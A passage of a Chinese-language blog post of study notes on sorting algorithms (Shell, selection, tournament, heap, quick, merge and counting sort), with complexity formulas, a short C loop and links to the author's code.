class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p><p>综合分析有n个元素的数组的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p></li></ul></li><li><p>表插入排序</p><ul><li><p><strong>思想</strong><br />当待排数组中的元素不是简简单单的整数，而是复杂的结构体，那么移动元素所花费的时间就不能忽略不计了，这时候我们要减少元素之间移动的次数了。表排序就是这么一个排序，在表排序的过程中，<mark>实际上是不需要移动元数的</mark>，我们要<mark>移动的是指向这些元素的指针</mark>。</p><p>与标准的插入排序一样，<mark>表插入排序的核心思想是在已排序部分找到新元素的适当位置并将其插入</mark>。但<mark>不同的是，这里我们使用链表来实现已排序段的维护和新元素的插入</mark>。</p></li><li><p>基本过程</p><ol><li><strong>初始化</strong>：<ul><li>创建一个新的链表，并将第一元素作为链表的头结点。</li></ul></li><li><strong>遍历原数组</strong>：<ul><li>从第二个元素开始，逐一遍历未排序的元素，对每个元素进行插入操作。</li></ul></li><li><strong>插入操作</strong>：<ul><li>对于每个新元素，遍历已排序的链表，找到插入位置。</li><li>在链表中找到第一个大于当前元素的节点，并将新元素插入到该位置之前。</li></ul></li><li><strong>更新链表</strong>：<ul><li>对每个新元素，调整链表的指针以保证链表始终保持有序。</li></ul></li></ol></li><li><p>性能分析：</p><p>与2路插入排序类似均为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p></li></ul></li><li><p><strong>希尔排序</strong>(Shell’s Sort)</p><ul><li><p>基本思想:将数据分组，然后将每一组进行插入排序，每一组排成有序后，整理就是有序的</p></li><li><p>一般的过程：</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240602213740101.png" class="" alt="image-20240602213740101" loading="lazy"><ul><li>首先将<code>gap</code>设置为<code>n/2</code>,用gap进行分组,如上图</li><li>对每个组进行简单插入排序</li><li>令<code>gap=gap/2</code></li><li>重复分组排序操作</li><li>直到<code>gap=1</code>再进行插入排序,结束，此时插入排序的对象就是一个基本有序的的数组</li></ul></li><li><p>性能分析：</p><p>我们知道，如果一个数组是有序的，那么插入排序的时间复杂度最好，为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>,而希尔排序就是利用这个特性,设置<code>gap</code>先粗略分割排序数组,从而使插入排序趋于最好的情况</p><p>因此希尔排序的时间复杂度介于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>N</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>之间，平均性能为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>N</mi><mn>1.3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N^{1.3})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">.</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><ul><li>一些常用的间隔序列（如Hibbard序列、Sedgewick序列）可以使得希尔排序的性能接近<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><msup><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msup><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N \log^2 N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.148448em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8984479999999999em;"><span style="top:-3.1473400000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>。</li></ul></li></ul></li></ul><h3 id="选择排序"><a class="markdownIt-Anchor" href="#选择排序"></a> 选择排序</h3><ul><li><p><strong>简单选择排序</strong>(simple Selection Sort)</p><p>时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>i从0开始迭代到n-1，j寻找L[i+1]~L[last]最小的元素，<code>SWAP L[i],L[min]</code></p></li><li><p><strong>树形选择排序</strong>(Tree Selection Sort)</p><ul><li><p>基本思想：<strong>树形选择排序</strong>（<strong>Tree Selection Sort</strong>），又称<strong>锦标赛排序</strong>（<strong>Tournament Sort</strong>），是一种按照锦标赛思想进行选择排序的方法。</p><p>首先对n个记录的关键字进行两两比较，然后在其中[n/2]（向上取整）个较小者之间再进行两两比较，如此重复，直至选出最小关键字的记录为止。</p></li></ul><p><code>胜者树和败者树是完全二叉树，是树形选择排序的变形</code>。</p><ul><li><p>过程：</p><ul><li><p>首先使用一维数组(长度为n)模拟完全二叉树(开辟2n长度的数组)</p><p>这里的难点是<mark>如何构建</mark></p><p>将初始的数组元素作为叶子节点放置在底层(tree[n+i]=L[i])</p><p>从底至顶构建比赛树，每层进行比较，败者向上晋级</p><p><mark>设root从1开始</mark>,<code>父节点下标为i，左子节点的下标为2i，右子节点的下标为2i+1</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">:</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>通过比赛，确定当前最小元素</p><p>将当前最小元素从原数组中移除，并在比赛树种重新进行比较和调整</p><p>重复此过程，直到所有元素排序完成</p></li><li><p>这里的难点是<mark>如何调整</mark></p><ul><li>首先将已选择最小值的叶子节点设为无穷大（表示已经移除）</li><li>从该叶子节点开始往上调整树，更新父亲节点的值</li></ul></li></ul></li><li><p>性能分析</p><ul><li><p>时间复杂度：</p><ol><li>构建比赛树<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li><li>调整树，从该叶子节点向上进行<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>次比较和更新，直至根节点</li><li>由于每次选择最小，然后调整树，综合起来的时间复杂度就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li></ol></li><li><p>空间复杂度</p><p>需要额外的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>空间来存储比赛树，不太好</p></li></ul></li><li><p>代码实现</p><p><a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Sort/treeInsertionSort.cpp">DataStructuresAndAlgorithms/C/Sort/treeInsertionSort.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul></li><li><p><strong>堆排序</strong>(Heap Sort)</p><p>堆排序是对树形选择排序的改进,避免了空间复杂度太高</p><p><a href="https://www.bilibili.com/video/BV1AF411G7cA/?spm_id_from=333.337.search-card.all.click&amp;vd_source=2dd928d1666db052f11478fedb530519">【从堆的定义到优先队列、堆排序】 10分钟看懂必考的数据结构——堆_哔哩哔哩_bilibili</a></p><ul><li><p>堆的定义:</p><ol><li>堆是一个<mark>完全二叉树</mark></li><li><mark>堆序性</mark><ul><li>大根堆:每个父节点元素都要大于它的子节点元素</li><li>小根堆:每个父节点元素都要小于它的子节点元素</li></ul></li></ol></li><li><p>堆的存储</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240601195002217.png" class="" alt="image-20240601195002217" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240601195014169.png" class="" alt="image-20240601195014169" loading="lazy"><p>如果用数组存储，如上图</p><p><mark>节点下标为i</mark></p><p><mark>左子节点下标为2i+1</mark></p><p><mark>右子节点下标为2i+2</mark></p></li><li><p>堆的基本操作</p><ul><li><p>上滤</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240601195617126.png" class="" alt="image-20240601195617126" loading="lazy"><p>只有树的最后一个元素破坏了堆序性，就跟父节点比较，如果大于就交换</p><ul><li>用于插入新元素到堆中</li><li>复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></li><li>可以构建成堆</li></ul></li><li><p><mark>下滤</mark></p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240601195259366.png" class="" alt="image-20240601195259366" loading="lazy"><p>将破坏了堆序性的节点(父节点)与它的最大的子节点进行比较,如果小于它的最大子节点，则与之交换;持续比较，交换，直到该元素大于它的子节点位置或者下滤到底部</p><ul><li>复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></li><li>可以重新构建成堆</li></ul></li></ul></li><li><p>堆的构建</p><ul><li><code>自顶向下建堆法</code></li></ul><p>过程:1.插入堆 2.上滤</p><p>复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(NlogN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></p><ul><li><p><code>自下而上建堆法</code></p><p>过程:对每个父节点进行下滤</p><p>复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></p></li></ul></li><li><p>堆的应用</p><ol><li><p>优先队列</p><p>用小根堆弹出最小元素</p></li></ol></li><li><p>堆排序</p><ul><li>首先<mark>自下而上建立大顶堆</mark>，时间复杂度为<code>O(N)</code></li><li>再调整堆，把<mark>根节点(最大值)和队尾元素交换位置</mark>，再<mark>进行下滤操作</mark>，反复进行,时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></li></ul><p>综合起来的时间复杂度就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(NlogN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></p><p>代码实现:<a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Sort/heapSort.cpp">DataStructuresAndAlgorithms/C/Sort/heapSort.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul></li></ul><h3 id="交换排序"><a class="markdownIt-Anchor" href="#交换排序"></a> 交换排序</h3><ul><li><p><strong>冒泡排序</strong>(Bubble Sort)</p><ul><li>时间复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>N</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li></ul></li><li><p><strong>快速排序</strong>(Quick Sort)</p><ul><li><p>基本思想</p><ol><li>选定<code>Privot</code>中心轴</li><li>将大于<code>Pivot</code>的数字放在<code>Pivot</code>的右边</li><li>将小于<code>Pivot</code>的数字放在<code>Pivot</code>的左边</li><li>分别对左右子序列重复前三步操作</li></ol><p><code>Privot</code>选什么都行</p><p>关键是如何把子序列给排序(利用双指针法)</p><ul><li><p>首先设置<code>l</code>指针,<code>r</code>指针指向起始位置,先<code>SWAP L[last],Pivot</code></p></li><li><p>此时，<code>l</code>和<code>r</code>都指向最左端的元素，开始迭代比较</p><p>我们可以利用双指针法，将<code>l</code>视作<code>小于Pivot序列</code>和<code>大于Pivot序列</code>的分界线，而<code>r</code>视作<code>大于Pivot</code>和<code>未探索区域</code>的分界线,区间均为<code>左闭右开</code></p><p>如果<code>r</code>指向的元素大于<code>Pivot</code>,<code>r</code>++,如果<code>r</code>指向的元素小于<code>Pivot</code>,交换<code>L[r]</code>与<code>L[l]</code>,<code>l++</code>,<code>r++</code></p><p>最后<code>r</code>指向末尾，结束迭代</p></li><li><p>最后,SWAP<code>L[last]</code>与<code>L[l]</code></p></li></ul></li><li><p>性能分析:根据算法的过程，显然是<code>不稳定</code>的,</p><p>时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(NlogN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></p></li><li><p>代码实现:<a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Sort/quickSort.cpp">DataStructuresAndAlgorithms/C/Sort/quickSort.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul></li></ul><h3 id="归并排序"><a class="markdownIt-Anchor" href="#归并排序"></a> 归并排序</h3><ul><li><p><strong>归并排序</strong>(Merge Sort)</p><ul><li><p>基本思想:</p><p><mark>递归</mark></p><p>归并排序算法有两个基本的操作，一个是<code>分</code>，也就是把<code>原数组划分成两个子数组的过程</code>。另一个是<code>治</code>，它将<code>两个有序数组合并成一个更大的有序数组</code>。</p><p><strong>将待排序的线性表不断地切分成若干个子表，直到每个子表只包含一个元素，这时，可以认为只包含一个元素的子表是有序表。</strong><br /><strong>将子表两两合并，每合并一次，就会产生一个新的且更长的有序表，重复这一步骤，直到最后只剩下一个子表，这个子表就是排好序的线性表。</strong></p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240602210246625.png" class="" alt="image-20240602210246625" loading="lazy"></li><li><p>关键:</p><p>把原数组划分为子数组很简单，利用递归</p><p><mark>关键是分完了如何合并成一个更长的有序数组?</mark></p><ul><li><p>首先，从图中可以看出，每个<code>merge</code>操作都是针对两个子数组(用L,R代称)而言的</p><p>那么我们开辟一个数组T用于存储归并好的数组，设置三个指针，<code>i</code>和<code>j</code>分别指向两个子数组的首位,<code>k</code>指向<code>T</code>数组的首位</p><ul><li><p>如果<code>L[i]&lt;=R[j]</code>,则<code>T[k]=L[i],i++</code></p></li><li><p>如果<code>L[i]&gt;R[j]</code>，则<code>T[k]=R[j]，j++</code></p></li><li><p>显然当<code>i</code>或<code>j</code>指向末尾了就不能继续比较操作了，由于我们每个子数组都是有序的（根据递归得到的),我们可以直接复制<code>L</code>或<code>R</code>剩余的元素到<code>T</code>中,获得有序的长数组</p></li></ul></li></ul></li><li><p>性能分析：</p><p>显然，归并排序是稳定的</p><p>时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(NlogN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></p></li><li><p>代码实现<a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Sort/mergeSort.cpp">DataStructuresAndAlgorithms/C/Sort/mergeSort.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul></li></ul><h3 id="分类排序"><a class="markdownIt-Anchor" href="#分类排序"></a> 分类排序</h3><h4 id="计数排序"><a class="markdownIt-Anchor" href="#计数排序"></a> 计数排序</h4><ul><li><p>例如，一个序列具有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>8</mn></msup></mrow><annotation encoding="application/x-tex">10^8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span>个元素，但是范围都在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation 